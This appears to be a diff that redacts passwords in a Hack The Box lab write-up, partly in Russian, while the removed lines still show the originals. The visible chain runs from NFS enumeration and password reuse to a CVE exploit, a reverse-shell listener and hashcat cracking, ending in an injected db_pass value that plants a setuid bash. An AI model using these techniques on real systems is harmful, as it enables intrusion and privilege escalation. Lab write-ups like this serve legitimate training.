@@ -18,13 +18,13 @@ Reconnaissance
 Foothold (NFS)
 ├── showmount -e enigma.htb → /srv/nfs/onboarding *
 ├── mount -t nfs enigma.htb:/srv/nfs/onboarding /tmp/nfs_enigma -o nolock
-├── pdftotext New_Employee_Access.pdf → kevin:Enigma2024!
+├── pdftotext New_Employee_Access.pdf → kevin:<PASSWORD>
 └── /etc/hosts: 10.129.239.191 enigma.htb mail001.enigma.htb
 
 Lateral Movement (Password Reuse + Mail)
-├── IMAP: curl -k 'imaps://enigma.htb/INBOX' --user 'kevin:Enigma2024!'
-├── Roundcube → sarah:Enigma2024!
-├── Письмо IT → OpenSTAManager: admin:Ne3s4rtars78s
+├── IMAP: curl -k 'imaps://enigma.htb/INBOX' --user 'kevin:<PASSWORD>'
+├── Roundcube → sarah:<PASSWORD>
+├── Письмо IT → OpenSTAManager: admin:<PASSWORD>
 └── /etc/hosts: support_001.enigma.htb
 
 Exploitation (OpenSTAManager CVE-2025-69212)
@@ -35,10 +35,10 @@ Exploitation (OpenSTAManager CVE-2025-69212)
 └── Reverse shell: nc -lvnp 4444
 
 Lateral Movement (Config → MySQL → Hash)
-├── config.inc.php → brollin / Fri3nds@9099
+├── config.inc.php → brollin / <PASSWORD>
 ├── mysql → SELECT username, password FROM zz_users
 ├── haris:$2y$... (bcrypt)
-└── hashcat -m 3200 → haris:bestfriends
+└── hashcat -m 3200 → haris:<PASSWORD>
 
 User Flag
 └── su haris → user.txt
@@ -49,6 +49,8 @@ Privilege Escalation (OliveTin)
 ├── Exploit: db_pass = "x' ; install -m 4755 /bin/bash /tmp/.bs ; #"
 └── /tmp/.bs -p → root
 ```
+
+> Note: All flags, passwords, and hashes have been masked for ethical reasons.
 
 ---
 
@@ -94,7 +96,7 @@ pdftotext /tmp/nfs_enigma/New_Employee_Access.pdf -
 Учётные данные:
 
 - Username: `kevin`
-- Password: `Enigma2024!`
+- Password: `<PASSWORD>`
 - Webmail: `http://mail001.enigma.htb`
 
 ---
@@ -105,16 +107,16 @@ pdftotext /tmp/nfs_enigma/New_Employee_Access.pdf -
 # /etc/hosts:
 # 10.129.239.191 enigma.htb mail001.enigma.htb
 
-curl -k 'imaps://enigma.htb/INBOX' --user 'kevin:Enigma2024!'
+curl -k 'imaps://enigma.htb/INBOX' --user 'kevin:<PASSWORD>'
 ```
 
 В INBOX - приветственное письмо от `sarah@enigma.htb`.
 
-Roundcube: `http://mail001.enigma.htb`, вход `sarah:Enigma2024!`. В почте - письмо IT с доступами к OpenSTAManager:
+Roundcube: `http://mail001.enigma.htb`, вход `sarah:<PASSWORD>`. В почте - письмо IT с доступами к OpenSTAManager:
 
 - URL: `http://support_001.enigma.htb`
 - Username: `admin`
-- Password: `Ne3s4rtars78s`
+- Password: `<PASSWORD>`
 
 ---
 
@@ -159,13 +161,13 @@ export TERM=xterm
 ```bash
 cat /var/www/html/openstamanager/config.inc.php
 # $db_username = 'brollin';
-# $db_password = 'Fri3nds@9099';
+# $db_password = '<PASSWORD>';
 
-mysql -u brollin -p'Fri3nds@9099' openstamanager
+mysql -u brollin -p'<PASSWORD>' openstamanager
 SELECT username, password FROM zz_users;
 
 hashcat -m 3200 haris-hash /usr/share/wordlists/rockyou.txt --force
-# haris:bestfriends
+# haris:<PASSWORD>
 
 su haris
 cat ~/user.txt
